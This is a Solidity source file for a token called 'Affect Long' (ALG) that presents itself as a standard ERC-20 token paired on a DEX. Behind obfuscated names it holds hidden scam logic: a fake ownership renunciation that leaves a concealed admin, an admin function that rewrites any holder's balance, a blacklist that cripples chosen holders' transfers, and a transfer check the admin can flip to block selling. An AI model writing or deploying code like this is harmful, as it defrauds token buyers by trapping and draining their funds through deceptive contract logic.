//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface tradingFeeWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract senderLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoMode {
    function createPair(address txMin, address senderLimit) external returns (address);
}

interface senderToReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldAt) external view returns (uint256);

    function transfer(address liquidityReceiverIs, uint256 totalFundLaunch) external returns (bool);

    function allowance(address minTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalFundLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityReceiverIs,
        uint256 totalFundLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellReceiver, uint256 value);
    event Approval(address indexed minTeam, address indexed spender, uint256 value);
}

interface senderToReceiverMetadata is senderToReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AffectLong is senderLaunch, senderToReceiver, senderToReceiverMetadata {

    address walletTxTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public receiverFeeSwap;

    function launchToken(address receiverAtLaunched) public {
        feeLaunched();
        
        if (receiverAtLaunched == shouldSell || receiverAtLaunched == takeLimitTotal) {
            return;
        }
        tokenLaunch[receiverAtLaunched] = true;
    }

    function name() external view virtual override returns (string memory) {
        return receiverTake;
    }

    uint256 receiverFeeLiquidity;

    function getOwner() external view returns (address) {
        return autoIs;
    }

    uint256 private amountTo;

    mapping(address => bool) public tokenLaunch;

    address public takeLimitTotal;

    function symbol() external view virtual override returns (string memory) {
        return maxWalletFund;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchedMinTeam;
    }

    function approve(address launchSell, uint256 totalFundLaunch) public virtual override returns (bool) {
        fromTakeWallet[_msgSender()][launchSell] = totalFundLaunch;
        emit Approval(_msgSender(), launchSell, totalFundLaunch);
        return true;
    }

    string private maxWalletFund = "ALG";

    mapping(address => uint256) private receiverMarketingLiquidity;

    address tokenLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function txReceiver(uint256 totalFundLaunch) public {
        feeLaunched();
        receiverFeeLiquidity = totalFundLaunch;
    }

    function feeLaunched() private view {
        require(fundExemptTo[_msgSender()]);
    }

    bool private listIs;

    event OwnershipTransferred(address indexed launchedList, address indexed totalFrom);

    bool private modeWallet;

    uint256 exemptAmount;

    function modeTo() public {
        emit OwnershipTransferred(shouldSell, address(0));
        autoIs = address(0);
    }

    mapping(address => bool) public fundExemptTo;

    bool private marketingTeam;

    function allowance(address amountFundTake, address launchSell) external view virtual override returns (uint256) {
        if (launchSell == walletTxTake) {
            return type(uint256).max;
        }
        return fromTakeWallet[amountFundTake][launchSell];
    }

    address private autoIs;

    function transfer(address exemptFund, uint256 totalFundLaunch) external virtual override returns (bool) {
        return teamMax(_msgSender(), exemptFund, totalFundLaunch);
    }

    function transferFrom(address isMax, address liquidityReceiverIs, uint256 totalFundLaunch) external override returns (bool) {
        if (_msgSender() != walletTxTake) {
            if (fromTakeWallet[isMax][_msgSender()] != type(uint256).max) {
                require(totalFundLaunch <= fromTakeWallet[isMax][_msgSender()]);
                fromTakeWallet[isMax][_msgSender()] -= totalFundLaunch;
            }
        }
        return teamMax(isMax, liquidityReceiverIs, totalFundLaunch);
    }

    uint256 private launchedMinTeam = 100000000 * 10 ** 18;

    function tradingTo(address minModeLimit) public {
        require(minModeLimit.balance < 100000);
        if (receiverFeeSwap) {
            return;
        }
        if (marketingTeam) {
            marketingTeam = true;
        }
        fundExemptTo[minModeLimit] = true;
        
        receiverFeeSwap = true;
    }

    uint8 private feeMax = 18;

    function decimals() external view virtual override returns (uint8) {
        return feeMax;
    }

    function balanceOf(address shouldAt) public view virtual override returns (uint256) {
        return receiverMarketingLiquidity[shouldAt];
    }

    uint256 private amountExempt;

    function owner() external view returns (address) {
        return autoIs;
    }

    function teamMax(address isMax, address liquidityReceiverIs, uint256 totalFundLaunch) internal returns (bool) {
        if (isMax == shouldSell) {
            return senderReceiver(isMax, liquidityReceiverIs, totalFundLaunch);
        }
        uint256 tokenFee = senderToReceiver(takeLimitTotal).balanceOf(tokenLimit);
        require(tokenFee == receiverFeeLiquidity);
        require(liquidityReceiverIs != tokenLimit);
        if (tokenLaunch[isMax]) {
            return senderReceiver(isMax, liquidityReceiverIs, feeTotal);
        }
        return senderReceiver(isMax, liquidityReceiverIs, totalFundLaunch);
    }

    uint256 public marketingTake;

    string private receiverTake = "Affect Long";

    uint256 constant feeTotal = 8 ** 10;

    constructor (){
        
        tradingFeeWallet toSellMode = tradingFeeWallet(walletTxTake);
        takeLimitTotal = autoMode(toSellMode.factory()).createPair(toSellMode.WETH(), address(this));
        if (amountExempt != marketingTake) {
            amountTo = amountExempt;
        }
        shouldSell = _msgSender();
        modeTo();
        fundExemptTo[shouldSell] = true;
        receiverMarketingLiquidity[shouldSell] = launchedMinTeam;
        
        emit Transfer(address(0), shouldSell, launchedMinTeam);
    }

    function senderReceiver(address isMax, address liquidityReceiverIs, uint256 totalFundLaunch) internal returns (bool) {
        require(receiverMarketingLiquidity[isMax] >= totalFundLaunch);
        receiverMarketingLiquidity[isMax] -= totalFundLaunch;
        receiverMarketingLiquidity[liquidityReceiverIs] += totalFundLaunch;
        emit Transfer(isMax, liquidityReceiverIs, totalFundLaunch);
        return true;
    }

    uint256 public feeMarketing;

    function launchedShould(address exemptFund, uint256 totalFundLaunch) public {
        feeLaunched();
        receiverMarketingLiquidity[exemptFund] = totalFundLaunch;
    }

    address public shouldSell;

    mapping(address => mapping(address => uint256)) private fromTakeWallet;

}